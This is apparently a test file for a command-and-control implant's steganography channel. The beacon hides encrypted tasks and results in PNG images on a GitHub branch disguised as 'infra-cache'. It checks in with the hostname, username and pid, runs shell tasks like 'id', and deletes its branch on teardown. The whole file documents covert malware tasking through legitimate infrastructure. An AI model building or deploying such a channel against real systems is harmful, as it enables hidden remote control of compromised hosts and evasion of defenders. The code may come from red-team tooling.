import { describe, it, expect, mock, beforeEach } from "bun:test";

// ── Mocks (must be declared before module import) ─────────────────────────────

const mockGit = {
  getRef:       mock(async () => ({ data: { object: { sha: "abc123" } } })),
  createBlob:   mock(async () => ({ data: { sha: "blob123" } })),
  getCommit:    mock(async () => ({ data: { tree: { sha: "tree123" } } })),
  createTree:   mock(async () => ({ data: { sha: "newtree123" } })),
  createCommit: mock(async () => ({ data: { sha: "newcommit123" } })),
  updateRef:    mock(async () => ({})),
  createRef:    mock(async () => ({})),
  deleteRef:    mock(async () => ({})),
};

const mockRepos = {
  get:        mock(async () => ({})),
  getContent: mock(async () => ({ data: { type: "file", content: "" } })),
};

const mockActions = {
  getRepoVariable: mock(async () => ({ data: { value: "" } })),
};

mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest = { git: mockGit, repos: mockRepos, actions: mockActions };
  },
}));

import { SteganographyTentacle } from "../tentacles/SteganographyTentacle.ts";
import { StegoCodec } from "../lib/StegoCodec.ts";
import { encodePng, decodePng, makePixelBuffer } from "../lib/PngEncoder.ts";
import { generateKeyPair, bytesToBase64, encryptBox } from "../crypto/sodium.ts";
import type { BeaconConfig } from "../types.ts";

// ── Helpers ───────────────────────────────────────────────────────────────────

async function makeConfig(): Promise<BeaconConfig> {
  const kp = await generateKeyPair();
  return {
    id: "abcd1234-5678-90ab-cdef-1234567890ab",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["stego"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: kp,
  };
}

const PAYLOAD = {
  beaconId:  "abcd1234-5678-90ab-cdef-1234567890ab",
  publicKey: "",
  hostname:  "host",
  username:  "user",
  os:        "linux",
  arch:      "x64",
  pid:       1234,
  checkinAt: new Date().toISOString(),
};

function clearAllMocks() {
  mockGit.getRef.mockClear();
  mockGit.createBlob.mockClear();
  mockGit.getCommit.mockClear();
  mockGit.createTree.mockClear();
  mockGit.createCommit.mockClear();
  mockGit.updateRef.mockClear();
  mockGit.createRef.mockClear();
  mockGit.deleteRef.mockClear();
  mockRepos.get.mockClear();
  mockRepos.getContent.mockClear();
  mockActions.getRepoVariable.mockClear();
}

// ── Helper: build a valid task PNG with an encrypted payload ──────────────────

async function makeTaskPng(
  cfg: BeaconConfig,
  operatorKp: { publicKey: Uint8Array; secretKey: Uint8Array },
  taskList: any[],
): Promise<string> {
  const encrypted = await encryptBox(
    JSON.stringify(taskList),
    cfg.beaconKeyPair.publicKey,
    operatorKp.secretKey,
  );
  const taskJsonBytes = new TextEncoder().encode(JSON.stringify(encrypted));
  const { pixels, width, height } = makePixelBuffer(taskJsonBytes.length);
  StegoCodec.encode(pixels, taskJsonBytes);
  const pngBytes = encodePng(pixels, width, height);
  // Convert to base64 for GitHub API mock (content field)
  let b64 = "";
  const chunkSize = 0x8000;
  for (let i = 0; i < pngBytes.length; i += chunkSize) {
    b64 += String.fromCharCode(...pngBytes.subarray(i, i + chunkSize));
  }
  return btoa(b64);
}

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("PngEncoder", () => {
  it("encodePng + decodePng round-trip", () => {
    const width = 10, height = 5;
    const pixels = new Uint8Array(width * height * 4);
    // Fill with non-trivial RGBA values
    for (let i = 0; i < pixels.length; i++) pixels[i] = (i * 37 + 13) & 0xff;
    // Ensure alpha is non-zero so PNG doesn't collapse
    for (let i = 3; i < pixels.length; i += 4) pixels[i] = 200 + (i % 55);

    const pngBytes = encodePng(pixels, width, height);
    expect(pngBytes.length).toBeGreaterThan(8); // at minimum PNG signature

    const decoded = decodePng(pngBytes);
    expect(decoded.width).toBe(width);
    expect(decoded.height).toBe(height);
    expect(decoded.pixels).toEqual(pixels);
  });

  it("makePixelBuffer returns buffer large enough for given payload length", () => {
    const payloadLen = 100;
    const { pixels, width, height } = makePixelBuffer(payloadLen);
    const pixelsNeeded = StegoCodec.pixelsNeeded(payloadLen);
    const totalPixels = width * height;
    expect(totalPixels).toBeGreaterThanOrEqual(pixelsNeeded);
    expect(pixels.length).toBe(width * height * 4);
    // Alpha bytes should be 255
    for (let i = 3; i < pixels.length; i += 4) {
      expect(pixels[i]).toBe(255);
    }
  });

  it("encodePng + decodePng preserves stego payload", () => {
    const payload = new TextEncoder().encode("hello stego png world");
    const { pixels, width, height } = makePixelBuffer(payload.length);
    StegoCodec.encode(pixels, payload);
    const pngBytes = encodePng(pixels, width, height);
    const { pixels: decoded } = decodePng(pngBytes);
    const extracted = StegoCodec.decode(decoded);
    expect(extracted).not.toBeNull();
    expect(new TextDecoder().decode(extracted!)).toBe("hello stego png world");
  });
});

describe("SteganographyTentacle", () => {
  beforeEach(clearAllMocks);

  // ── isAvailable ──────────────────────────────────────────────────────────────

  it("isAvailable() returns true when git.getRef resolves successfully", async () => {
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "sha1" } } });
    const t = new SteganographyTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(true);
    expect(mockGit.getRef).toHaveBeenCalledTimes(1);
    const call = (mockGit.getRef as any).mock.calls[0][0];
    expect(call.ref).toBe("heads/infra-cache-abcd1234");
  });

  it("isAvailable() returns false when git.getRef throws 404", async () => {
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    const t = new SteganographyTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  it("isAvailable() returns false on other errors", async () => {
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Forbidden"), { status: 403 })
    );
    const t = new SteganographyTentacle(await makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  // ── checkin — ACK ────────────────────────────────────────────────────────────

  it("checkin() sends ACK on first call (creates blob/tree/commit/ref)", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    // writeFileBinary: getBranchSha → 404 (branch not created yet)
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    // readFileBinary for task PNG: 404
    mockRepos.getContent.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );

    const t = new SteganographyTentacle(cfg);
    const tasks = await t.checkin(PAYLOAD);

    expect(tasks).toEqual([]);
    expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
    expect(mockGit.createRef).toHaveBeenCalledTimes(1);
    const createRefCall = (mockGit.createRef as any).mock.calls[0][0];
    expect(createRefCall.ref).toBe("refs/heads/infra-cache-abcd1234");
  });

  it("checkin() does not resend ACK on subsequent calls", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    // First call: ACK write (branch doesn't exist)
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    mockRepos.getContent.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );

    const t = new SteganographyTentacle(cfg);
    await t.checkin(PAYLOAD);
    clearAllMocks();
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    // Second call: no ACK, just poll
    // Provide a new SHA so dedup check doesn't short-circuit before getContent
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "new-sha-second-call" } } });
    mockRepos.getContent.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );

    await t.checkin(PAYLOAD);
    expect(mockGit.createRef).not.toHaveBeenCalled();
    expect(mockGit.createBlob).not.toHaveBeenCalled();
  });

  // ── checkin — task polling ────────────────────────────────────────────────────

  it("checkin() returns [] when no task file exists", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    // ACK write
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    // Task file not found
    mockRepos.getContent.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );

    const t = new SteganographyTentacle(cfg);
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
  });

  it("checkin() decodes and returns tasks when task PNG is present", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    const taskList = [{ taskId: "t1", kind: "shell" as const, args: { cmd: "id" }, ref: "r1" }];
    const taskPngBase64 = await makeTaskPng(cfg, operatorKp, taskList);

    // ACK write: getBranchSha → 404 → createRef
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    // getBranchSha for SHA dedup check (comes before PNG download now)
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "task-commit-sha" } } });
    // Task PNG found
    mockRepos.getContent.mockResolvedValueOnce({
      data: { type: "file", content: taskPngBase64 },
    });
    // deleteFile: getBranchSha
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "task-commit-sha" } } });

    const t = new SteganographyTentacle(cfg);
    const tasks = await t.checkin({ ...PAYLOAD, beaconId: cfg.id });

    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("t1");
    expect(tasks[0]!.kind).toBe("shell");
    // deleteFile should trigger an updateRef
    expect(mockGit.updateRef).toHaveBeenCalled();
  });

  // ── submitResult ──────────────────────────────────────────────────────────────

  it("submitResult() creates result PNG blob on branch", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });

    // writeFileBinary: branch already exists
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "head-sha" } } });

    const t = new SteganographyTentacle(cfg);
    await t.submitResult({
      taskId:      "taskid-1234-abcd",
      beaconId:    cfg.id,
      success:     true,
      output:      "done",
      completedAt: new Date().toISOString(),
    });

    expect(mockGit.createBlob).toHaveBeenCalledTimes(1);
    expect(mockGit.createTree).toHaveBeenCalledTimes(1);
    const treeCall = (mockGit.createTree as any).mock.calls[0][0];
    expect(treeCall.tree[0].path).toBe("infra-abcd1234-r.png");
  });

  it("submitResult() resolves without throwing", async () => {
    const cfg = await makeConfig();
    const operatorKp = await generateKeyPair();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });
    mockGit.getRef.mockResolvedValueOnce({ data: { object: { sha: "head-sha" } } });

    const t = new SteganographyTentacle(cfg);
    await expect(
      t.submitResult({
        taskId:      "t1",
        beaconId:    "abcd1234-5678-90ab-cdef-1234567890ab",
        success:     true,
        output:      "ok",
        completedAt: new Date().toISOString(),
      })
    ).resolves.toBeUndefined();
  });

  // ── checkin() returns [] without throwing (basic guard) ──────────────────────

  it("checkin() returns [] without throwing", async () => {
    const cfg = await makeConfig();
    const operatorKp = await generateKeyPair();
    const opPubB64 = await bytesToBase64(operatorKp.publicKey);
    mockActions.getRepoVariable.mockResolvedValue({ data: { value: opPubB64 } });
    // ACK write: getBranchSha → 404
    mockGit.getRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    // No task file
    mockRepos.getContent.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );

    const t = new SteganographyTentacle(cfg);
    const tasks = await t.checkin(PAYLOAD);
    expect(tasks).toEqual([]);
  });

  // ── encodePayload + decodePayload round-trip ──────────────────────────────────

  it("encodePayload + decodePayload round-trip", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig();

    const t = new SteganographyTentacle(cfg);

    const plaintext = "hello stego world";
    // encodePayload returns sealed bytes (base64url encoded sealed box)
    const payloadBytes = await t.encodePayload(plaintext, operatorKp.publicKey);

    // Embed the sealed bytes into a pixel buffer
    const pixelCount = StegoCodec.pixelsNeeded(payloadBytes.length);
    const pixels = new Uint8Array(pixelCount * 4);
    StegoCodec.encode(pixels, payloadBytes);

    // decodePayload extracts the base64url string from the pixel buffer
    const decoded = await t.decodePayload(pixels);
    expect(decoded).not.toBeNull();
    // The decoded output is the base64url string of the sealed box
    // Verify it has a reasonable length (sealed box is longer than plaintext)
    expect(decoded!.length).toBeGreaterThan(plaintext.length);
    // And it should match the original payloadBytes when re-encoded
    expect(Array.from(new TextEncoder().encode(decoded!))).toEqual(Array.from(payloadBytes));
  });

  // ── teardown ─────────────────────────────────────────────────────────────────

  it("teardown() deletes the infra-cache branch ref", async () => {
    const t = new SteganographyTentacle(await makeConfig());
    await t.teardown();
    expect(mockGit.deleteRef).toHaveBeenCalledTimes(1);
    const call = (mockGit.deleteRef as any).mock.calls[0][0];
    expect(call.ref).toBe("heads/infra-cache-abcd1234");
  });

  it("teardown() does not throw when deleteRef fails", async () => {
    mockGit.deleteRef.mockRejectedValueOnce(
      Object.assign(new Error("Not Found"), { status: 404 })
    );
    const t = new SteganographyTentacle(await makeConfig());
    await expect(t.teardown()).resolves.toBeUndefined();
  });
});
